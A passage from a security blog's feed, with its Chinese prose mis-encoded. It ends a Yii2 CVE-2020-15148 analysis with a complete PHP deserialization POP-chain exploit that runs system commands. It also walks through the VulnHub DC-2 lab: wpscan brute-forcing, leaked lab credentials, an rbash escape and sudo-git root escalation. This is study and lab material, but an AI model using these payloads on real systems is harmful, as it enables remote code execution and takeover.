punctuation">,</span> <span class="token variable">$itemKey</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">path</span><span class="token operator">.</span><span class="token string single-quoted-string">'/'</span><span class="token operator">.</span><span class="token variable">$nsKey</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">rmdir</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">path</span><span class="token operator">.</span><span class="token string single-quoted-string">'/'</span><span class="token operator">.</span><span class="token variable">$nsKey</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">unset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">keys</span><span class="token punctuation">[</span><span class="token variable">$nsKey</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">clearKey</span><span class="token punctuation">(</span><span class="token variable">$nsKey</span><span class="token punctuation">,</span> <span class="token variable">$itemKey</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token function">hasKey</span><span class="token punctuation">(</span><span class="token variable">$nsKey</span><span class="token punctuation">,</span> <span class="token variable">$itemKey</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">freeHandle</span><span class="token punctuation">(</span><span class="token variable">$nsKey</span><span class="token punctuation">,</span> <span class="token variable">$itemKey</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">path</span><span class="token operator">.</span><span class="token string single-quoted-string">'/'</span><span class="token operator">.</span><span class="token variable">$nsKey</span><span class="token operator">.</span><span class="token string single-quoted-string">'/'</span><span class="token operator">.</span><span class="token variable">$itemKey</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p><code>unlink</code>ä½¿ç”¨æ‹¼æ¥å­—ç¬¦ä¸²ï¼Œ<code>$this-&gt;path</code>å¯æ§ï¼Œå³å¯æƒ³åˆ°è°ƒç”¨<code>__toString</code>æ–¹æ³•ï¼ˆå½“ä¸€ä¸ªå¯¹è±¡è¢«å½“åšå­—ç¬¦ä¸²ä½¿ç”¨æ—¶è¢«è°ƒç”¨ï¼‰</p><p>å…¨å±€æŸ¥æ‰¾<code>__toString()</code>æ–¹æ³•ï¼Œæœ€å¥½æ‰¾ä¸€äº›<strong>è°ƒç”¨å…¶ä»–ç±»å‡½æ•°</strong>çš„<code>__toString</code></p><p>æœ‰å¦‚ä¸‹çš„å‡ ä¸ªç±»ä¸­çš„<code>__toString</code>æ–¹æ³•å¯ç”¨ï¼š</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token class-name class-name-fully-qualified static-context"><span class="token punctuation">\</span>Codeception<span class="token punctuation">\</span>Util<span class="token punctuation">\</span>XmlBuilder</span><span class="token operator">::</span><span class="token constant">__toString</span> <span class="token operator">-></span> <span class="token class-name class-name-fully-qualified static-context"><span class="token punctuation">\</span>DOMDocument</span><span class="token operator">::</span><span class="token constant">saveXML</span> å¯ä»¥è§¦å‘__callæ–¹æ³•<span class="token class-name class-name-fully-qualified static-context"><span class="token punctuation">\</span>phpDocumentor<span class="token punctuation">\</span>Reflection<span class="token punctuation">\</span>DocBlock<span class="token punctuation">\</span>Tags<span class="token punctuation">\</span>Covers</span><span class="token operator">::</span><span class="token constant">__toString</span> <span class="token operator">-></span> <span class="token property">render</span> å¯ä»¥è§¦å‘__callæ–¹æ³•<span class="token class-name class-name-fully-qualified static-context"><span class="token punctuation">\</span>phpDocumentor<span class="token punctuation">\</span>Reflection<span class="token punctuation">\</span>DocBlock<span class="token punctuation">\</span>Tags<span class="token punctuation">\</span>Deprecated</span><span class="token operator">::</span><span class="token constant">__toString</span> <span class="token operator">-></span> <span class="token property">render</span> å¯ä»¥è§¦å‘__callæ–¹æ³•<span class="token class-name class-name-fully-qualified static-context"><span class="token punctuation">\</span>phpDocumentor<span class="token punctuation">\</span>Reflection<span class="token punctuation">\</span>DocBlock<span class="token punctuation">\</span>Tags<span class="token punctuation">\</span>Generic</span><span class="token operator">::</span><span class="token constant">__toString</span> <span class="token operator">-></span> <span class="token property">render</span> å¯ä»¥è§¦å‘__callæ–¹æ³•<span class="token class-name class-name-fully-qualified static-context"><span class="token punctuation">\</span>phpDocumentor<span class="token punctuation">\</span>Reflection<span class="token punctuation">\</span>DocBlock<span class="token punctuation">\</span>Tags<span class="token punctuation">\</span>See</span><span class="token operator">::</span><span class="token constant">__toString</span> <span class="token operator">-></span> <span class="token property">render</span>å¯ä»¥è§¦å‘__callæ–¹æ³•<span class="token class-name class-name-fully-qualified static-context"><span class="token punctuation">\</span>phpDocumentor<span class="token punctuation">\</span>Reflection<span class="token punctuation">\</span>DocBlock<span class="token punctuation">\</span>Tags<span class="token punctuation">\</span>Link</span><span class="token operator">::</span><span class="token constant">__toString</span> <span class="token operator">-></span> <span class="token property">render</span><span class="token operator">...</span></code></pre><p>è¿™é‡Œä»¥<code>\Codeception\Util\XmlBuilder::__toString</code>ä¸ºä¾‹</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">__dom__</span><span class="token operator">-></span><span class="token function">saveXML</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p><code>$this-&gt;__dom__</code>å¯æ§ï¼Œåœ¨è°ƒç”¨<code>saveXML()</code>æ–¹æ³•çš„æ—¶å€™ä¼šè°ƒç”¨<code>__call</code>æ–¹æ³•ã€‚</p><p>popé“¾å¦‚ä¸‹ï¼š</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token class-name class-name-fully-qualified static-context"><span class="token punctuation">\</span>Swift_KeyCache_DiskKeyCache</span><span class="token operator">::</span><span class="token constant">__destruct</span> <span class="token operator">-></span> <span class="token property">clearAll</span> <span class="token operator">-></span> <span class="token property">clearKey</span> <span class="token operator">-></span> <span class="token property">__toString</span><span class="token operator">-></span> <span class="token class-name class-name-fully-qualified static-context"><span class="token punctuation">\</span>Codeception<span class="token punctuation">\</span>Util<span class="token punctuation">\</span>XmlBuilder</span><span class="token operator">::</span><span class="token constant">__toString</span> <span class="token operator">-></span> <span class="token property">saveXML</span><span class="token operator">-></span> <span class="token class-name class-name-fully-qualified static-context">Faker<span class="token punctuation">\</span>Generator</span><span class="token operator">::</span><span class="token function">__call</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">format</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token function">call_user_func_array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token class-name class-name-fully-qualified static-context"><span class="token punctuation">\</span>yii<span class="token punctuation">\</span>rest<span class="token punctuation">\</span>IndexAction</span><span class="token operator">::</span><span class="token constant">run</span> <span class="token operator">-></span> <span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>Exp</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">// EXP: Swift_KeyCache_DiskKeyCache::__destruct -> __toString -> __call</span><span class="token keyword">namespace</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">use</span> <span class="token package">Codeception<span class="token punctuation">\</span>Util<span class="token punctuation">\</span>XmlBuilder</span><span class="token punctuation">;</span>    <span class="token keyword">use</span> <span class="token package">phpDocumentor<span class="token punctuation">\</span>Reflection<span class="token punctuation">\</span>DocBlock<span class="token punctuation">\</span>Tags<span class="token punctuation">\</span>Covers</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Swift_KeyCache_DiskKeyCache</span><span class="token punctuation">&#123;</span>        <span class="token keyword">private</span> <span class="token variable">$path</span><span class="token punctuation">;</span>        <span class="token keyword">private</span> <span class="token variable">$keys</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">keys</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>                <span class="token string double-quoted-string">"extrader"</span> <span class="token operator">=></span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"is"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"am"</span><span class="token punctuation">)</span>            <span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//æ³¨æ„ ClearAllä¸­çš„æ•°ç»„è§£æäº†ä¸¤æ¬¡ï¼Œä¹‹åå†unlink</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">path</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XmlBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$payload</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Swift_KeyCache_DiskKeyCache</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">Codeception<span class="token punctuation">\</span>Util</span><span class="token punctuation">&#123;</span>    <span class="token keyword">use</span> <span class="token package">Faker<span class="token punctuation">\</span>Generator</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">XmlBuilder</span><span class="token punctuation">&#123;</span>        <span class="token keyword">protected</span> <span class="token variable">$__dom__</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">__dom__</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Generator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">phpDocumentor<span class="token punctuation">\</span>Reflection<span class="token punctuation">\</span>DocBlock<span class="token punctuation">\</span>Tags</span><span class="token punctuation">&#123;</span>    <span class="token keyword">use</span> <span class="token package">Faker<span class="token punctuation">\</span>Generator</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Covers</span><span class="token punctuation">&#123;</span>        <span class="token keyword">private</span> <span class="token variable">$refers</span><span class="token punctuation">;</span>        <span class="token keyword">protected</span> <span class="token variable">$description</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">description</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Generator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">refers</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"AnyStringisOK"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">yii<span class="token punctuation">\</span>rest</span><span class="token punctuation">&#123;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">IndexAction</span><span class="token punctuation">&#123;</span>        <span class="token keyword">public</span> <span class="token variable">$checkAccess</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token variable">$id</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">checkAccess</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'system'</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">id</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'whoami'</span><span class="token punctuation">;</span>           <span class="token comment">//command</span>            <span class="token comment">// run() -> call_user_func($this->checkAccess, $this->id);</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">Faker</span><span class="token punctuation">&#123;</span>    <span class="token keyword">use</span> <span class="token package">yii<span class="token punctuation">\</span>rest<span class="token punctuation">\</span>IndexAction</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Generator</span><span class="token punctuation">&#123;</span>        <span class="token keyword">protected</span> <span class="token variable">$formatters</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">formatters</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'saveXML'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name">IndexAction</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'run'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span></code></pre><p>å‘åŒ…ï¼ŒæˆåŠŸå‘½ä»¤æ‰§è¡Œ</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E(CVE-2020-15148)%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/image-20210513201308446.png" alt loading="lazy"></p><h3 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h3><ul><li>å‘ç°è¿™å‡ ä¸ªpopé“¾ç”¨æ¥ç”¨å»æœ€åéƒ½æ˜¯é ç€<code>__call</code>æ–¹æ³•æ¥è§¦å‘ä»£ç æ‰§è¡Œï¼Œä»£ç å®¡è®¡çš„å°‘ï¼Œä»¥åå†é‡åˆ°ä»£ç å®¡è®¡çš„é—®é¢˜å¯ä»¥å¤šå¤šè€ƒè™‘è¿™ä¸€æ–¹é¢çš„ä¸œè¥¿</li><li>å–„äºæœç´¢ï¼Œä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼ï¼Œæ¯”å¦‚æ»¡è¶³<code>\$this-&gt;(\w+)-&gt;(\w+)\(\)</code>è¿™ä¸ªæ­£åˆ™çš„å°±å¯èƒ½å¯ä»¥è§¦å‘<code>__call</code>æ–¹æ³•</li><li>æ‰¾é“¾çš„å¼€ç«¯å¯ä»¥å°è¯•ä»<code>__destruct</code>å…¥æ‰‹ï¼Œç„¶åè¿½é“¾ï¼Œè¿½æ–¹æ³•</li><li><code>call_user_func</code>ä¸­çš„<code>callback</code>å¯ä»¥æ˜¯æ•°ç»„</li><li>æ•´ä¸ªpopé“¾ä¸‹æ¥è¿˜æ˜¯å­¦åˆ°ä¸å°‘ä¸œè¥¿çš„ï¼Œæ…¢æ…¢æ¥å§</li></ul><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><ul><li><a href="https://v0w.top/2020/09/22/Yii2unserialize/">Yii2 ååºåˆ—åŒ–ï¼ˆCVE-2020-15148ï¼‰å­¦ä¹ ç¬”è®°</a></li><li><a href="https://forum.butian.net/share/56">Yiiååºåˆ—åŒ–æ¼æ´å¤ç°åˆ°æ–°åˆ©ç”¨é“¾å‘ç°</a></li><li><a href="https://mp.weixin.qq.com/s/NHBpF446yKQbRTiNQr8ztA">CVE-2020-15148 Yii2ååºåˆ—åŒ–RCE POPé“¾åˆ†æ</a></li><li><a href="https://www.anquanke.com/post/id/217930">æˆ‘æ˜¯å¦‚ä½•æŒ–æ˜yii2ååºåˆ—åŒ–0dayçš„</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;Yii2ä»‹ç»&quot;&gt;&lt;a href=&quot;#Yii2ä»‹ç»&quot; class=&quot;headerlink&quot; title=&quot;Yii2ä»‹ç»&quot;&gt;&lt;/a&gt;Yii2ä»‹ç»&lt;/h3&gt;&lt;p&gt;Yii æ˜¯ä¸€ä¸ªé«˜æ€§èƒ½ï¼ŒåŸºäºç»„ä»¶çš„ PHP æ¡†æ¶ï¼Œç”¨äºå¿«é€Ÿå¼€å‘ç°ä»£ Web åº”ç”¨ç¨‹åºã€‚å³å¯ä»¥ç”¨äºå¼€å‘å„ç§ç”¨ P
      
    
    </summary>
    
    
      <category term="ä»£ç å®¡è®¡" scheme="https://www.extrader.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="php" scheme="https://www.extrader.top/tags/php/"/>
    
      <category term="ä»£ç å®¡è®¡" scheme="https://www.extrader.top/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="ååºåˆ—åŒ–" scheme="https://www.extrader.top/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>VulnHub-DC-2é¶åœºç»ƒä¹ </title>
    <link href="https://www.extrader.top/posts/ce8eed56/"/>
    <id>https://www.extrader.top/posts/ce8eed56/</id>
    <published>2021-05-02T13:45:30.000Z</published>
    <updated>2021-07-05T14:17:44.708Z</updated>
    
    <content type="html"><![CDATA[<p>é¶æœºåœ°å€ï¼š192.168.99.150ï¼ˆDC-2ï¼‰<a href="https://www.vulnhub.com/entry/dc-2,311/">é“¾æ¥</a></p><p>æ¸—é€æœºï¼š192.168.99.188ï¼ˆKaliï¼‰</p><p>ç‰©ç†ä¸»æœºï¼š192.168.99.107ï¼ˆWindows10ï¼‰</p><p>ç›®æ ‡ï¼šå°½å¯èƒ½æ‹¿åˆ°æ›´å¤šçš„flagï¼Œæœ‰5ä¸ª</p><p>nmapä¸»æœºå‘ç°ï¼š</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-2/image-20210502172127928.png" alt loading="lazy"></p><p>è®¿é—®80ç«¯å£ï¼Œå‘ç°æ˜¯ä¸€ä¸ªWordPressç«™ç‚¹ï¼Œé¦–é¡µæœ‰flag1ï¼Œå¦‚ä¸‹</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-2/image-20210502172310497.png" alt loading="lazy"></p><p>ä¼¼ä¹æ˜¯è®©æˆ‘ä»¬å¯¹ç”¨æˆ·è¿›è¡Œçˆ†ç ´ï¼Œä½†å¸¸è§„çš„å¯†ç å­—å…¸é‡Œå¯èƒ½æ²¡æœ‰æˆ‘ä»¬æ‰€éœ€è¦çš„å¯†ç ï¼Œäºæ˜¯é‡‡ç”¨<code>Cewl</code>è¿›è¡Œå¯†ç ä¿¡æ¯æœé›†</p><pre class="language-none"><code class="language-none">cewl http:&#x2F;&#x2F;dc-2&#x2F; -m 3 -d 3 -e -v -w wppass.txt-m æœ€å°å•è¯é•¿åº¦-dï¼šçˆ¬ç½‘æ·±åº¦-eï¼šæ”¶é›†åŒ…å«emailåœ°å€ä¿¡æ¯-vï¼šVerboseæ¨¡å¼ï¼Œè¯¥æ¨¡å¼ä¸‹ï¼ŒCewlä¼šå¯¼å‡ºç›®æ ‡ç½‘ç«™çš„è¯¦ç»†æ•°æ®-wï¼šä¿å­˜å­—å…¸æ–‡ä»¶</code></pre><p>å¾—åˆ°å­—å…¸åä½¿ç”¨wpscanå¯¹ç½‘ç«™åå°è¿›è¡Œæ‰«ææµ‹è¯•</p><pre class="language-none"><code class="language-none">wpscan --url http:&#x2F;&#x2F;dc-2&#x2F; -e u -P &#x2F;home&#x2F;kali&#x2F;msf_exp&#x2F;wppass.txt-e: æšä¸¾ uè¡¨ç¤ºæšä¸¾ç”¨æˆ·-P: çˆ†ç ´å¯†ç å­—å…¸è·¯å¾„</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-2/image-20210502173058881.png" alt loading="lazy"></p><p>æ‹¿åˆ°ä¸¤ä¸ªç”¨æˆ·çš„ç”¨æˆ·åå’Œå¯†ç </p><pre class="language-none"><code class="language-none">Username: jerry, Password: adipiscingUsername: tom, Password: parturient</code></pre><p>ç™»å½•åå°ï¼Œåœ¨pageé‡Œæ‹¿åˆ°flag2</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-2/image-20210502173751322.png" alt loading="lazy"></p><p>æ‰¾å…¶å®ƒçš„åˆ‡å…¥ç‚¹ï¼Œå‰é¢nmapåœ¨0-1000çš„ç«¯å£ä¸­åªæ‰«åˆ°äº†ä¸€ä¸ª80ç«¯å£ï¼ŒåŠ å¤§åŠ›åº¦ï¼Œæ”¹æˆ0-10000</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-2/image-20210502174409458.png" alt loading="lazy"></p><p>æ‰«åˆ°ä¸€ä¸ª7744çš„sshç«¯å£ï¼Œtomç”¨æˆ·è¿ä¸Šä½¿ç”¨wpçš„åå°å¯†ç å³å¯ç™»å½•ï¼Œjerryä¸è¡Œï¼Œå¯èƒ½ä¸æ˜¯è¿™ä¸ªå¯†ç ï¼Œä¹Ÿå¯èƒ½jerryä¸å…è®¸sshç™»å½•</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-2/image-20210502174816845.png" alt loading="lazy"></p><p>ç™»å½•ç›®å½•ä¸‹æ‰¾åˆ°flag3ï¼ŒlessæŸ¥çœ‹</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-2/image-20210502174852430.png" alt loading="lazy"></p><p>éšåå°è¯•å¾ˆå¤šå‘½ä»¤ç”¨ä¸äº†ï¼Œå½“å‰ç›®å½•ä¸‹çš„usrç›®å½•ä¹Ÿè¿›ä¸å»ï¼ŒæŸ¥çœ‹å½“å‰ç›®å½•ä¸‹æ‰€æœ‰æ–‡ä»¶ï¼ŒæŸ¥çœ‹<code>.bash_history</code></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-2/image-20210502175516495.png" alt loading="lazy"></p><p><code>ls -al usr/bin</code></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-2/image-20210502175312778.png" alt loading="lazy"></p><p>æœ‰å››ä¸ªå‘½ä»¤å¯ä»¥ç”¨ï¼Œå¹¶ä¸”ä½¿ç”¨çš„æ˜¯rbashï¼Œä¸€ä¸ªåŠŸèƒ½å—é™çš„bashï¼Œé™åˆ¶æ€§å¯èƒ½ä¼šæœ‰å¦‚ä¸‹</p><ul><li>ä½¿ç”¨å‘½ä»¤cdæ›´æ”¹ç›®å½•</li><li>è®¾ç½®æˆ–è€…å–æ¶ˆç¯å¢ƒå˜é‡çš„è®¾ç½®ï¼ˆSHELL, PATH, ENV, or BASH_ENVï¼‰</li><li>æŒ‡å®šåŒ…å«å‚æ•°<code>&#39;/&#39;</code>çš„æ–‡ä»¶å</li><li>æŒ‡å®šåŒ…å«å‚æ•°<code>&#39; - &#39;</code>çš„æ–‡ä»¶å</li><li>ä½¿ç”¨é‡å®šå‘è¾“å‡º<code>&#39;&gt;&#39;, &#39;&gt;&gt;&#39;, &#39;&gt; |&#39;, &#39;&lt;&gt;&#39; &#39;&gt;&amp;&#39;,&#39;&amp;&gt;&#39;</code></li></ul><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-2/image-20210502193832294.png" alt loading="lazy"></p><p>ä½¿ç”¨scpç»•è¿‡</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-2/image-20210502193742568.png" alt loading="lazy"></p><p>è¿˜å¯ä»¥è¿™æ ·</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-2/image-20210502200235932.png" alt loading="lazy"></p><p>ä¹Ÿå¯ä»¥ç”¨viï¼Œæ–¹æ³•ä¸å”¯ä¸€ï¼Œæ¬å¼ å›¾ï¼Œå¯å‚è€ƒæ–‡æœ«çš„é“¾æ¥</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-2/image-20210502200311594.png" alt loading="lazy"></p><p>åœ¨jerryçš„ç”¨æˆ·ç›®å½•ä¸‹æ‰¾åˆ°<code>flag4.txt</code></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-2/image-20210502200512732.png" alt loading="lazy"></p><p><code>you&#39;re on your own now.  :-)</code>ï¼Œçº¿ç´¢<code>git</code></p><p>é…ç½®å½“å‰shellç¯å¢ƒå˜é‡</p><pre class="language-none"><code class="language-none">export PATH&#x3D;$PATH:&#x2F;bin&#x2F;export PATH&#x3D;$PATH:&#x2F;usr&#x2F;bin</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-2/image-20210502211021164.png" alt loading="lazy"></p><p>å¤§éƒ¨åˆ†å‘½ä»¤å¯ç”¨äº†</p><p>æ ¹æ®flag3çš„æç¤ºï¼Œsuåˆ‡æ¢åˆ°jerryï¼Œå¯†ç å°±æ˜¯ä¸Šé¢çš„å¯†ç ï¼Œ<code>sudo -l</code>çœ‹çœ‹ç”¨æˆ·å¯ä»¥ç”¨sudoè¿è¡Œä¸€äº›å‘½ä»¤</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-2/image-20210502213404125.png" alt loading="lazy"></p><p>gitå¯ç”¨ï¼Œgitææƒ</p><pre class="language-none"><code class="language-none">sudo git help config  åœ¨æœ«è¡Œå‘½ä»¤æ¨¡å¼è¾“å…¥ !&#x2F;bin&#x2F;bash æˆ– !&#39;sh&#39;</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnHub-DC-2/image-20210502213732806.png" alt loading="lazy"></p><p>æˆåŠŸæ‹¿åˆ°æœ€åçš„flag    </p><p><strong>å‚è€ƒï¼š</strong></p><ul><li><a href="https://cloud.tencent.com/developer/article/1680551">RBash - å—é™çš„Bashç»•è¿‡</a></li><li><a href="https://www.const27.com/2021/03/12/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/">Linux ææƒæ€»ç»“</a></li><li><a href="https://www.secpulse.com/archives/72965.html">åˆ©ç”¨é€šé…ç¬¦å®ç°Linuxæœ¬åœ°ææƒ</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;é¶æœºåœ°å€ï¼š192.168.99.150ï¼ˆDC-2ï¼‰&lt;a href=&quot;https://www.vulnhub.com/entry/dc-2,311/&quot;&gt;é“¾æ¥&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;æ¸—é€æœºï¼š192.168.99.188ï¼ˆKaliï¼‰&lt;/p&gt;
&lt;p&gt;ç‰©ç†ä¸»æœºï¼š192.168.99.
      
    
    </summary>
    
    
      <category term="æ¸—é€" scheme="https://www.extrader.top/categories/%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="é¶æœº" scheme="https://www.extrader.top/tags/%E9%9D%B6%E6%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>VulnHub-DC-1é¶åœºç»ƒä¹ </title>
    <link href="https://www.extrader.top/posts/5787bcec/"/>
    <id>https://www.extrader.top/posts/5787bcec/</id>
    <published>2021-05-01T13:20:30.000Z</published>
    <updated>2021-07-05T14:17:47.615Z</updated>
    
